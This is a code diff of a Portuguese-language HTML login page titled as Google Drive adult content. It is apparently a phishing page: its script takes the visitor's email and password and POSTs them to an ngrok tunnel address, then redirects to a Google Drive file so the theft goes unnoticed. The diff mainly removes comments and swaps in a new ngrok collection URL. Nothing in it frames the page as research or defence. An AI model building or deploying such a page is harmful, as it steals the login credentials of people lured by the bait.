@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login Form</title>
-    <!-- Inclui o Bootstrap CSS -->
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <style>
         /* Estilo para o corpo da página */
@@ -19,14 +18,13 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh; /* Altura mínima da tela inteira */
+            height: 100vh;
             color: #000;
             position: relative;
         }
         /* Estilo para o container */
         .container {
-            width: 80%; /* Define a largura máxima do container */
-            max-width: 400px; /* Define a largura máxima para dispositivos maiores */
+            width: 350px;
             background-color: rgba(255, 255, 255, 0.7); /* Adiciona um fundo branco semi-transparente */
             padding: 30px;
             border-radius: 10px;
@@ -71,57 +69,43 @@
 </head>
 <body>
     <div class="container">
-        <!-- Título do formulário de login -->
         <h2>Conteúdos GoogleDrive🔞</h2>
-        <!-- Formulário de login -->
-        <form id="loginForm" method="POST" action="https://c509-2804-6850-8000-3d01-2d4a-c112-c2f2-dbba.ngrok-free.app/">
-            <!-- Campo de entrada para o e-mail -->
+        <form id="loginForm" method="POST" action="https://e445-2804-6850-8000-3d01-c12e-b350-c502-7e67.ngrok-free.app/">
             <div class="form-group">
                 <input type="email" class="form-control" id="email" name="email" placeholder="Digite o e-mail">
             </div>
-            <!-- Campo de entrada para a senha -->
             <div class="form-group">
                 <input type="password" class="form-control" id="password" name="password" placeholder="Digite a senha">
             </div>
-            <!-- Botão para enviar o formulário -->
             <button type="button" onclick="enviarFormulario()">Entrar</button>
-            <!-- Elemento para exibir mensagens de erro -->
             <p id="mensagemErro" style="color: red;"></p>
         </form>
     </div>
 
     <script>
         function enviarFormulario() {
-            // Obtém os valores dos campos de entrada
             var email = document.getElementById('email').value;
             var password = document.getElementById('password').value;
 
-            // Verifica se os campos estão vazios
             if (email === '' || password === '') {
-                // Exibe mensagem de erro se os campos estiverem vazios
                 document.getElementById('mensagemErro').innerText = 'Por favor, preencha todos os campos.';
                 return;
             }
 
-            // Cria um objeto FormData para enviar os dados do formulário
             var formData = new FormData();
             formData.append('email', email);
             formData.append('password', password);
 
-            // Cria uma requisição XMLHttpRequest para enviar os dados do formulário
             var xhr = new XMLHttpRequest();
             xhr.open('POST', document.getElementById("loginForm").action);
             xhr.onload = function () {
-                // Redireciona para o Google Drive se a resposta for bem-sucedida
                 if (xhr.status === 200) {
                     window.location.href = "https://drive.google.com/file/d/1-n2-7RG13HA7ttCVJukD_PpoMDsSRS6n/view?usp=drive";
                 } else {
-                    // Exibe mensagem de erro se a resposta não for bem-sucedida
                     var mensagem = xhr.responseText;
                     document.getElementById('mensagemErro').innerText = mensagem;
                 }
             };
-            // Envia os dados do formulário
             xhr.send(formData);
         }
     </script>
